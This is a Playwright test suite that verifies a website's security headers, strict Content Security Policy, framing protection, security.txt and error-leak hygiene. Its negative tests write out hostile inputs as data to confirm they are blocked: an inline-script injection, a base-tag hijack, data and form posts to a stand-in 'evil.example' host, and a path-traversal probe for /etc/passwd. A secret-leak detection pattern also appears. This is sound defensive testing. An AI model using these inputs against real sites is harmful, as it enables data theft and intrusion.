import { expect, test, type Page } from "@playwright/test";

import { bookingOrigin, prodURL } from "./support/servers";
import { waitForHydration } from "./support/motion";

/**
 * Security headers and the Content Security Policy on the PRODUCTION build.
 * The test server runs with CSP_MODE=enforce (playwright.config.ts), the
 * strictest setting, so a blocked script, style or request fails here.
 */

const PAGES = ["/it", "/en", "/it/non-esiste"];

/** Value of one CSP directive, or undefined. */
function directive(csp: string, name: string): string[] | undefined {
  return csp
    .split(";")
    .map((part) => part.trim().split(/\s+/))
    .find(([first]) => first === name)
    ?.slice(1);
}

const nonceOf = (csp: string) => /'nonce-([^']+)'/.exec(csp)?.[1] ?? "";

test.describe("security headers", () => {
  for (const path of PAGES) {
    test(`${path}: the fixed headers are present`, async ({ request }) => {
      const response = await request.get(path);
      const h = response.headers();

      expect(h["x-content-type-options"]).toBe("nosniff");
      expect(h["x-frame-options"]).toBe("DENY");
      expect(h["referrer-policy"]).toBe("strict-origin-when-cross-origin");
      expect(h["cross-origin-opener-policy"]).toBe("same-origin");
      expect(h["permissions-policy"]).toContain("camera=()");
      expect(h["permissions-policy"]).toContain("microphone=()");
      expect(h["permissions-policy"]).toContain("geolocation=()");
      expect(h["strict-transport-security"]).toBe(
        "max-age=63072000; includeSubDomains; preload",
      );
    });
  }

  test("a redirect (/) carries them too", async ({ request }) => {
    const response = await request.get("/", { maxRedirects: 0 });

    expect(response.status()).toBe(307);
    expect(response.headers()["x-content-type-options"]).toBe("nosniff");
    expect(response.headers()["content-security-policy"]).toContain(
      "default-src 'self'",
    );
  });

  test("an unknown page is still a real 404, not a soft 404 (dynamic rendering must not change the status)", async ({
    request,
  }) => {
    for (const path of ["/it/non-esiste", "/en/does/not/exist"]) {
      expect((await request.get(path)).status(), path).toBe(404);
    }
  });

  test("HTML is never cached: a cached page would replay an old nonce", async ({
    request,
  }) => {
    const control = (await request.get("/it")).headers()["cache-control"] ?? "";

    expect(control).toMatch(/no-store|no-cache|private/);
    expect(control).not.toMatch(/s-maxage=\d{3,}/);
  });
});

test.describe("the CSP header", () => {
  test("is enforced (not report-only) on the test server, and is strict", async ({
    request,
  }) => {
    const headers = (await request.get("/it")).headers();
    const csp = headers["content-security-policy"] ?? "";

    expect(headers["content-security-policy-report-only"]).toBeUndefined();
    expect(directive(csp, "default-src")).toEqual(["'self'"]);
    expect(directive(csp, "script-src")).toContain("'strict-dynamic'");
    expect(directive(csp, "script-src")).not.toContain("'unsafe-inline'");
    expect(directive(csp, "script-src")).not.toContain("'unsafe-eval'");
    expect(directive(csp, "object-src")).toEqual(["'none'"]);
    expect(directive(csp, "base-uri")).toEqual(["'none'"]);
    expect(directive(csp, "frame-ancestors")).toEqual(["'none'"]);
    expect(csp).toContain("upgrade-insecure-requests");
    // The only external origin is the booking page's, in frame-src (P2.7, set by
    // NEXT_PUBLIC_CAL_URL in playwright.config.ts); nothing else is configured.
    expect(directive(csp, "frame-src")).toEqual([bookingOrigin]);
    expect(csp.replace(`frame-src ${bookingOrigin}`, "")).not.toMatch(
      /https?:\/\//,
    );
  });

  for (const path of PAGES) {
    test(`${path}: every <script> in the HTML carries this response's nonce`, async ({
      request,
    }) => {
      const response = await request.get(path);
      const nonce = nonceOf(
        response.headers()["content-security-policy"] ?? "",
      );
      const html = await response.text();
      const tags = html.match(/<script\b[^>]*>/g) ?? [];

      expect(nonce).toMatch(/^[A-Za-z0-9+/]{22}==$/);
      expect(tags.length).toBeGreaterThan(5); // not vacuous
      const without = tags.filter((tag) => !tag.includes(`nonce="${nonce}"`));
      expect(without).toEqual([]);
    });
  }

  test("each request gets its own nonce, in the header and in the HTML", async ({
    request,
  }) => {
    const seen = new Set<string>();
    for (let i = 0; i < 6; i++) {
      const response = await request.get("/it");
      const nonce = nonceOf(
        response.headers()["content-security-policy"] ?? "",
      );
      expect((await response.text()).includes(`nonce="${nonce}"`)).toBe(true);
      seen.add(nonce);
    }

    expect(seen.size).toBe(6);
  });

  test("a client-supplied nonce or CSP header changes nothing (negative)", async ({
    request,
  }) => {
    const response = await request.get("/it", {
      headers: {
        "x-nonce": "attacker",
        "content-security-policy": "script-src *",
      },
    });
    const csp = response.headers()["content-security-policy"] ?? "";

    expect(csp).not.toContain("attacker");
    expect(csp).not.toContain("script-src *");
    expect(await response.text()).not.toContain('nonce="attacker"');
  });
});

/** Collect `securitypolicyviolation` events and console errors for the page's life. */
async function watchViolations(page: Page) {
  const consoleErrors: string[] = [];
  page.on("console", (message) => {
    if (message.type() === "error") consoleErrors.push(message.text());
  });
  page.on("pageerror", (error) => consoleErrors.push(String(error)));
  await page.addInitScript(() => {
    const w = window as unknown as { __csp: string[] };
    w.__csp = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      w.__csp.push(`${event.violatedDirective} <- ${event.blockedURI}`);
    });
  });
  return {
    consoleErrors,
    violations: () =>
      page.evaluate(() => (window as unknown as { __csp: string[] }).__csp),
  };
}

test.describe("an enforced CSP in a real browser", () => {
  for (const path of ["/it", "/en", "/it/non-esiste"]) {
    test(`${path}: loads, hydrates and runs with zero violations`, async ({
      page,
    }) => {
      const watch = await watchViolations(page);
      await page.goto(path);
      await waitForHydration(page);
      // Lenis (a lazy chunk, loaded after idle, adds a class and inline styles) must run too.
      await expect
        .poll(() =>
          page.evaluate(() =>
            document.documentElement.classList.contains("lenis"),
          ),
        )
        .toBe(true);

      expect(await watch.violations()).toEqual([]);
      // Chrome logs the 404 document's own status as a console error; that is
      // the point of the page, not a failed resource.
      expect(
        watch.consoleErrors.filter(
          (message) =>
            !(path.includes("non-esiste") && message.includes("status of 404")),
        ),
      ).toEqual([]);
    });
  }

  test("client-side navigation (language switch) also runs without a violation", async ({
    page,
  }) => {
    const watch = await watchViolations(page);
    await page.goto("/it");
    await waitForHydration(page);

    await page
      .getByRole("navigation", { name: "Lingua" })
      .getByRole("link", { name: /english/i })
      .click();
    await expect(page).toHaveURL(/\/en$/);
    await expect(page.locator("html")).toHaveAttribute("lang", "en");

    expect(await watch.violations()).toEqual([]);
    expect(watch.consoleErrors).toEqual([]);
  });

  test("makes no request to any other origin (privacy: nothing third-party before consent)", async ({
    page,
  }) => {
    const foreign: string[] = [];
    page.on("request", (request) => {
      const url = request.url();
      if (
        !url.startsWith(prodURL) &&
        !url.startsWith("data:") &&
        !url.startsWith("blob:")
      )
        foreign.push(url);
    });

    for (const path of ["/it", "/en"]) {
      await page.goto(path);
      await expect
        .poll(() =>
          page.evaluate(() =>
            document.documentElement.classList.contains("lenis"),
          ),
        )
        .toBe(true);
    }

    expect(foreign).toEqual([]);
  });
});

test.describe("what the enforced CSP blocks (negative tests)", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto("/it");
    await waitForHydration(page);
  });

  /** Run `code` in the page and return the violations it caused. */
  async function violationsFrom(page: Page, code: () => void) {
    await page.evaluate(() => {
      (window as unknown as { __csp: string[] }).__csp = [];
      document.addEventListener("securitypolicyviolation", (event) => {
        (window as unknown as { __csp: string[] }).__csp.push(
          `${event.violatedDirective} <- ${event.blockedURI}`,
        );
      });
    });
    await page.evaluate(code);
    await page.waitForTimeout(500);
    return page.evaluate(
      () => (window as unknown as { __csp: string[] }).__csp,
    );
  }

  test("an inline event handler injected into the page does not run", async ({
    page,
  }) => {
    const violations = await violationsFrom(page, () => {
      document.body.insertAdjacentHTML(
        "beforeend",
        '<img src="x" onerror="window.__pwned = 1">',
      );
    });

    expect(await page.evaluate(() => "__pwned" in window)).toBe(false);
    expect(violations.some((v) => v.startsWith("script-src"))).toBe(true);
  });

  test("a <base> injected to hijack relative URLs is blocked (base-uri 'none')", async ({
    page,
  }) => {
    const violations = await violationsFrom(page, () => {
      document.head.insertAdjacentHTML(
        "beforeend",
        '<base href="https://evil.example/">',
      );
    });

    expect(violations.some((v) => v.startsWith("base-uri"))).toBe(true);
  });

  test("data cannot be sent to another origin (connect-src 'self')", async ({
    page,
  }) => {
    const result = await page.evaluate(() =>
      fetch("https://evil.example/collect", { method: "POST", body: "x" }).then(
        () => "sent",
        () => "blocked",
      ),
    );

    expect(result).toBe("blocked");
  });

  test("an image from another origin is not loaded (img-src)", async ({
    page,
  }) => {
    const loaded = await page.evaluate(
      () =>
        new Promise<boolean>((resolve) => {
          const image = new Image();
          image.onload = () => {
            resolve(true);
          };
          image.onerror = () => {
            resolve(false);
          };
          image.src = "https://evil.example/pixel.png";
        }),
    );

    expect(loaded).toBe(false);
  });

  test("an unlisted origin cannot be embedded in the page (frame-src allows only the booking origin)", async ({
    page,
  }) => {
    const violations = await violationsFrom(page, () => {
      const frame = document.createElement("iframe");
      frame.src = "https://evil.example/";
      document.body.append(frame);
    });

    expect(violations.some((v) => v.startsWith("frame-src"))).toBe(true);
  });

  test("a form cannot post to another origin (form-action 'self')", async ({
    page,
  }) => {
    const violations = await violationsFrom(page, () => {
      const form = document.createElement("form");
      form.action = "https://evil.example/steal";
      form.method = "post";
      document.body.append(form);
      form.requestSubmit();
    });

    expect(violations.some((v) => v.startsWith("form-action"))).toBe(true);
  });
});

test.describe("the site cannot be framed by another origin", () => {
  test("clickjacking: an iframe of the site inside another page does not load", async ({
    page,
  }) => {
    await page.setContent(
      `<iframe src="${prodURL}/it" width="600" height="400"></iframe>`,
    );
    await page.waitForTimeout(1500);

    const loadedSite = page
      .frames()
      .filter((frame) => frame.url().startsWith(prodURL));
    expect(loadedSite).toEqual([]);
  });
});

test.describe("/.well-known/security.txt (RFC 9116)", () => {
  test("is plain text, has Contact, a future Expires under a year, and a Canonical that points at itself", async ({
    request,
  }) => {
    const response = await request.get("/.well-known/security.txt");
    const body = await response.text();

    expect(response.status()).toBe(200);
    expect(response.headers()["content-type"]).toMatch(/^text\/plain/);
    expect(response.headers()["content-type"]).toMatch(/charset=utf-8/i);
    expect(response.headers()["x-content-type-options"]).toBe("nosniff");

    expect(body).toMatch(/^Contact: (https:\/\/|http:\/\/|mailto:)\S+$/m);
    const expires = /^Expires: (\S+)$/m.exec(body)?.[1] ?? "";
    const when = Date.parse(expires);
    expect(Number.isNaN(when)).toBe(false);
    expect(when).toBeGreaterThan(Date.now());
    expect(when).toBeLessThan(Date.now() + 365 * 24 * 3600 * 1000);
    expect(body).toMatch(
      new RegExp(`^Canonical: ${prodURL}/\.well-known/security\.txt$`, "m"),
    );
  });

  test("is not served through the locale redirect and is not a 404 page", async ({
    request,
  }) => {
    const response = await request.get("/.well-known/security.txt", {
      maxRedirects: 0,
    });

    expect(response.status()).toBe(200);
    expect(await response.text()).not.toMatch(/<html/i);
  });
});

/** What a failing response must never contain: stack frames, file paths, framework internals. */
const LEAKS =
  /node_modules|webpack-internal|\.next[\\/]|\b[A-Za-z]:\\[\w.-]{2,}\\|\/(?:Users|home|var|app)\/\S|\bsrc[\\/](?:app|lib|components|i18n)\b|\bat\s+[\w$.<>]+\s+\(|\bstack ?trace\b|"stack"|\.stack\b|\bdigest\b|ECONNREFUSED|postgres(?:ql)?:\/\/|\bDATABASE_URL\b|CRON_SECRET/i;

/**
 * The first leak in `body`, or null. Next marks its own 404 page with a fixed
 * `"digest":"NEXT_HTTP_ERROR_FALLBACK;404"`: a status code, not an error id, so
 * it is removed before looking.
 */
const firstLeak = (body: string) => {
  // The marker appears both plain and inside an escaped JSON string.
  const marker = /\\*"digest\\*":\\*"NEXT_HTTP_ERROR_FALLBACK;404\\*"/g;
  const clean = body.replaceAll(marker, "");
  const hit = LEAKS.exec(clean);
  return hit === null
    ? null
    : clean.slice(Math.max(0, hit.index - 60), hit.index + 60);
};

test.describe("errors leak nothing (P4.4)", () => {
  test("the detector itself finds a stack frame, a path, a connection string and a digest (not vacuous)", () => {
    for (const leak of [
      "Error: x\n    at handler (/app/server.js:10:5)",
      "/Users/dev/project/src/app/page.tsx",
      "postgres://user:pw@host/db",
      "see node_modules/next/dist/server.js",
      '{"digest":"3849201"}',
    ]) {
      expect(firstLeak(leak), leak).not.toBeNull();
    }
    expect(firstLeak("Pagina non trovata, full-stack")).toBeNull();
  });

  test("API error responses carry no body details, only a status", async ({
    request,
  }) => {
    const responses = [
      await request.get("/api/cron/purge-expired"), // no secret: 401 or 503
      await request.get("/api/cron/purge-expired", {
        headers: { authorization: "Bearer wrong" },
      }),
      await request.post("/api/consent", {
        headers: { "content-type": "text/plain" },
        data: "x",
      }),
      await request.post("/api/consent", {
        headers: { "content-type": "application/json" },
        data: "{not json",
      }),
      await request.post("/api/demo-events", {
        headers: { "content-type": "application/json" },
        data: "{not json",
      }),
      await request.get("/api/consent"), // wrong method
    ];

    for (const response of responses) {
      const body = await response.text();
      expect(response.status(), response.url()).toBeGreaterThanOrEqual(400);
      expect(firstLeak(body), response.url()).toBeNull();
      expect(
        response.headers()["x-powered-by"],
        response.url(),
      ).toBeUndefined();
    }
  });

  test("an unknown API path and unknown pages are generic 404s with no internals", async ({
    request,
  }) => {
    for (const path of ["/api/does-not-exist", "/it/non-esiste", "/en/a/b/c"]) {
      const response = await request.get(path);
      expect(response.status(), path).toBe(404);
      expect(firstLeak(await response.text()), path).toBeNull();
    }
  });

  test("a broken percent-escape in a page path is a 400, with no body (it used to be a 500)", async ({
    request,
  }) => {
    for (const path of ["/it/%E0%A4%A", "/%E0%A4%A", "/en/%ZZ"]) {
      const response = await request.get(path);
      expect(response.status(), path).toBe(400);
      expect(await response.text(), path).toBe("");
    }
  });

  test("other hostile paths and a broken escape under /api never show a stack or a path", async ({
    request,
  }) => {
    // /api is outside the proxy, so Next itself answers a broken escape there
    // (500, plain "Internal Server Error": a framework behaviour, recorded in
    // docs/state/tasks/P4.4.md). What matters here is that nothing leaks.
    for (const path of [
      "/api/%E0%A4%A",
      "/%00",
      "/it/..%2f..%2fetc%2fpasswd",
    ]) {
      const response = await request.get(path);
      expect(firstLeak(await response.text()), path).toBeNull();
    }
  });

  test("responses do not advertise the framework or its version", async ({
    request,
  }) => {
    const headers = (await request.get("/it")).headers();

    expect(headers["x-powered-by"]).toBeUndefined();
    expect(headers["server"] ?? "").not.toMatch(/next|node|express/i);
  });
});
